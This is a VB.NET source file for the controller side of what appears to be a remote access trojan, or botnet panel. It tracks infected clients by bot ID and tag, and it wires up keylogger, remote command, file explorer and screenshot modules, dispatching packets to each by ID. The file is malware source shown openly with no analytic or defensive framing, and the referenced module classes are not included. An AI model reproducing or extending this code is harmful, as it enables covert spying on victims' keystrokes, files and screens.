Imports System.Net.Sockets
Imports System.Threading


Public Structure structClientInfo
    Public IP As String
    Public windowVersion As String
    Public computerUserName As String
    Public userName As String
    Public countryCode As String
    Public botTag As String
    Public botID As String
    Public WindowTitle As String
    Public FirstConnectionTime As DateTime
End Structure

Public Class clsClientObj

    'Public
    Public Sub New(ByVal mConn As TcpClient, ByVal m_password As String)
        Conn = New clsConnection(mConn)
        password = m_password
    End Sub

    Public Function OnInit_Event() As Boolean
        'Init info obj
        InfoObj = New clsInfo(Conn)
        InfoObj.OnInit()

        'Init Cmd Obj
        CmdObj = New clsCommand(Conn)
        CmdObj.OnInit()

        'Init Keylogger Obj
        KeyloggerObj = New clsKeylogger(Conn, InfoObj)
        KeyloggerObj.OnInit()

        'Init File Explorer Obj
        FileExplorerObj = New clsFileExplorer(Conn, InfoObj)
        FileExplorerObj.OnInit()

        'Init Screenshot Obj
        ScreenshotObj = New clsScreenshot(Conn, InfoObj)
        ScreenshotObj.OnInit()

        'Init switch obj
        SwitchObj = New clsSwitch(Conn, InfoObj)
        SwitchObj.OnInit()
        SwitchObj.SendRequiredPassword()

        Return True
    End Function

    Public Function MainThread()

        Dim packet As Byte() = Nothing
        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()


        'Dispatch packet
        While IsConnected()
            If Conn.RecvRawPacket(packet) = True Then
                'Process packet
                Dim ID As Integer = BinReader.BufferReadDWORD(packet, 0)
                If ID = 5 Or IsAccepted() Then 'Only allow switch obj when client is not authen
                    Dim FeatureObj As clsBoneObj = GetFeaObjByID(ID)
                    If FeatureObj Is Nothing = False Then
                        Dim PacketForObj As Byte() = BinReader.BufferReadBuffer(packet, 8, packet.Length - 8)
                        FeatureObj.OnPacketArrived(PacketForObj)
                    Else
                        Utilities.GlobalLog("Unknown obj from " & InfoObj.GetClientInfo.computerUserName)
                    End If
                End If
            End If
        End While

        Return True
    End Function

    Public Function IsAccepted() As Boolean
        Return SwitchObj.IsClientAccept()
    End Function
    Public Sub UpdateInfo()
        If IsConnected() And IsAccepted() Then
            InfoObj.SendGetWindowTitle()
        End If
    End Sub

    Public Function GetClientInfo() As structClientInfo
        Return InfoObj.GetClientInfo()
    End Function

    Public Function IsConnected() As Boolean
        Return Conn.IsConnected()
    End Function

    Public Sub ForceDisconnect()
        Conn.CloseConnection()
    End Sub

    Public Function GetFeaObjByID(ByVal ObjID As Integer) As clsBoneObj
        Select Case ObjID
            Case 0
                Return InfoObj
            Case 1
                Return CmdObj
            Case 2
                Return KeyloggerObj
            Case 3
                Return FileExplorerObj
            Case 4
                Return ScreenshotObj
            Case 5
                Return SwitchObj
        End Select
        Return Nothing
    End Function

    'Private
    Private password As String
    Private Conn As clsConnection
    Private InfoObj As clsInfo
    Private CmdObj As clsCommand
    Private KeyloggerObj As clsKeylogger
    Private FileExplorerObj As clsFileExplorer
    Private ScreenshotObj As clsScreenshot
    Private SwitchObj As clsSwitch
End Class


Public Class clsClientMgr
    'Public
    Public Function GetClientList()
        Return clientList
    End Function

    Public Function GetAcceptedClientList() As List(Of clsClientObj)
        Dim activedClientList As List(Of clsClientObj) = New List(Of clsClientObj)
        For Each clientObj In clientList
            If clientObj.IsAccepted() Then
                activedClientList.Add(clientObj)
            End If
        Next
        Return activedClientList
    End Function

    Public Function RegisterClient(ByVal clientObj As clsClientObj) As Boolean
        'Init client: feature obj and authen client
        clientObj.OnInit_Event()

        'Create Thread for new client obj
        Dim StartClientThread As Thread = New Thread(AddressOf ClientThread)
        StartClientThread.Priority = ThreadPriority.BelowNormal
        StartClientThread.Start(clientObj)

        'Finally add to list
        clientList.Add(clientObj)
        Return True
    End Function

    Public Function RefreshClient()
        For Each client In clientList.ToList()
            If client.IsAccepted() = False Then
                'If client is not authen for 1 minute then close client
                If (DateTime.Now - client.GetClientInfo().FirstConnectionTime).TotalSeconds > 60 Then
                    clientList.Remove(client)
                End If
            Else
                If client.IsConnected() = False Then
                    clientList.Remove(client)
                End If
            End If
        Next
        Return True
    End Function


    'Private
    Private clientList As New List(Of clsClientObj)

    Private Sub ClientThread(ByVal ClientObj As clsClientObj)
        ClientObj.MainThread()
    End Sub
End Class